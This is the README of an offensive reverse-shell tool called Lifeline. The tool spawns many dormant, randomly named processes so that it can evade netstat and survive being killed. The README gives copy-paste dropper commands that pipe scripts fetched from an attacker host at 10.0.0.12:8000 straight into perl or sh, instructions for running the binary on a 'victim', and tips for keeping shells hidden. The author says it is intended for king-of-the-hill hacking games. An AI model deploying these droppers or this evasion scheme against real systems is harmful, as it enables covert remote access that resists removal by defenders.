# Lifeline

Lifeline is a reverse shell that's designed to be hard to detect and hard to kill. It does this by spawning many dormant processes with randomized names that can take over when a shell is killed.

## tl;dr:
![](.github/meme.png)

It is like the cockroach of reverse shells; Not particularly nice to look at, but it will survive almost anything.


## Features
### Pros
 * Easily spawn many reverse shells as background processes
 * Only one process will connect back to your listener, leaving all other processes undetected by `netstat`
 * Random process names
 * Does not use a `pts`
 * Compatible with [pwncat](https://github.com/calebstewart/pwncat)
 * Included `perl` dropper runs [directly from RAM](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html).
### Cons
 * The reverse shell is compiled, making it harder to deploy if your target has a different architecture.


## Dependencies
* GCC
* make
* python3 (used as a basic webserver)

## Usage
### All-In-One
To compile and serve a lifeline binary, use the following command:
```
make serve HOST=x.x.x.x
```
This command will build the binary, create dropper scripts and hosts them using `python3`'s webserver.

```
[~/git/lifeline]~$ make serve HOST=10.0.0.12
=========================================================
  Hosting dropper on http://10.0.0.12:8000...        
  Copy/Paste payloads:                                   
                                                         
 In memory:                                              
  curl http://10.0.0.12:8000/dropper.pl | perl       
  wget -O - http://10.0.0.12:8000/dropper.pl | perl  
                                                         
 Temp file:                                              
  curl http://10.0.0.12:8000/dropper.sh | sh         
  wget -O - http://10.0.0.12:8000/dropper.sh | sh    

 Raw download:
  curl http://10.0.0.12:8000/lineline > lifeline         
  wget http://10.0.0.12:8000/lifeline
=========================================================

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

After which you can open a new terminal with a `nc` listener on port `1337` and wait for the callback.  
From the `nc` listener, you can execute commands directly or drop into an `sh` process using the "!shell" command.

### Manual
You can compile lifeline using the following command:
```
make HOST=x.x.x.x
```
This will place a compiled reverse shell in the `build` directory. You can start reverse shells by running the following command on the victim:
```
./lifeline [number of shells]
```


## Make flags:
|Flag      |                                                            |
|----------|------------------------------------------------------------|
|`HOST`    | Listener IP address.                                       |
|`PORT`    | Listener port, defaults to `1337`.                         |
|`NUM`     | Number of processes started by a dropper, defaults to `10`.|
|`PY_PORT` | Port used for Python http server, defaults to 8000.        |


## Practicalities
* Since the lifeline processes are spawned in quick succession, they will likely have sequential `PID`'s. Spawning a small amount of new shells manually will yield better results than spawning 100 shells at once.
* By spawning a few lifelines without opening a listener, you can keep the processes hidden until your other shells are killed.

## F.A.Q.
### Q; Does this provide an persistence against reboots?
No, I created this program mostly for "KOTH"-like hacking games, where reboots aren't really an issue.  
### Q; Why is the shell so bad?
The default "shell" is actually just a bunch of `popen` calls. You should can either:
1. Type "!shell" to drop into a shell.
1. Use [pwncat](https://github.com/calebstewart/pwncat) as a listener.
